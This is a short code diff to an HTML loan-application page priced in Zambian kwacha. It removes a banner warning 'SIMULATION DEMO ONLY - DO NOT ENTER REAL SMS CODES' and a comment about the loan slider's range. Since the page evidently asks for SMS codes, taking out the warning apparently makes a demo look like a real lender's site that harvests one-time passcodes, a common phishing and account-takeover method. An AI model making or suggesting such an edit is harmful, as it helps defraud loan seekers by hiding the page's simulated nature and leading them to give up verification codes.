@@ -25,11 +25,6 @@
 </head>
 <body>
 
-    <!-- DEMO WARNING BANNER -->
-    <div style="background-color: #ffcc00; color: #000; text-align: center; padding: 8px; font-weight: bold; font-size: 14px; position: fixed; top: 0; width: 100%; z-index: 1000;">
-        ⚠️ SIMULATION DEMO ONLY - DO NOT ENTER REAL SMS CODES ⚠️
-    </div>
-
     <!-- Screen 1: Language Selection (English Only) -->
     <div id="language-screen" class="dark-screen active">
         <div class="dark-card popup-card">
@@ -69,7 +64,6 @@
                     <div class="slider-labels">
                         <span><span data-translate="calc_amount">Amount</span>: <strong class="highlight-yellow" id="amountDisplay">ZMW 15,000</strong></span>
                     </div>
-                    <!-- Changed min to 500, max to 100000, step to 500, and default value to 15000 -->
                     <input type="range" id="loanAmount" min="500" max="100000" step="500" value="15000" oninput="updateLoanValue()">
                     <div class="range-limits"><span>ZMW 500</span><span>ZMW 100,000</span></div>
                 </div>
